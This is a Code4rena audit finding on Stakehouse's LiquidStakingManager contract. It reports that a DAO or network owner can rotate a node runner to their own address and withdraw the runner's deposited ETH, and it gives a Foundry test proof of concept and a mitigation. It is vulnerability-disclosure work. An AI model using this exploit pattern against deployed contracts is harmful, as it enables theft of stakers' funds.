## Tags

- bug
- 2 (Med Risk)
- downgraded by judge
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- M-09

# [DAO or lsdn owner can steal funds from node runner](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/109) 

# Lines of code

https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377


# Vulnerability details

## Impact
DAO or lsd network owner can swap node runner of the smart contract to their own eoa, allowing them to withdrawETH or claim rewards from node runner. 

## Proof of Concept
there are no checks done when swapping the node runner whether there are funds in the smart contract that belongs to the node runner. Therefore, a malicious dao or lsd network owner can simply swap them out just right after the node runner has deposited 4 ether in the smart wallet.

place poc in LiquidStakingManager.sol

```solidity
    function testDaoCanTakeNodeRunner4ETH() public {
        address nodeRunner = accountOne; vm.deal(nodeRunner, 4 ether);
        address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);
        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);
        address attacker = accountFour;


        registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);

        vm.startPrank(admin);
        manager.rotateNodeRunnerOfSmartWallet(nodeRunner, attacker, true);

        vm.stopPrank();

        vm.startPrank(attacker);
        emit log_uint(attacker.balance);
        manager.withdrawETHForKnot(attacker,blsPubKeyOne);
        emit log_uint(attacker.balance);
        vm.stopPrank();
    }

```

## Tools Used

forge

## Recommended Mitigation Steps
Send back outstanding ETH and rewards that belongs to node runner if swapping is needed. 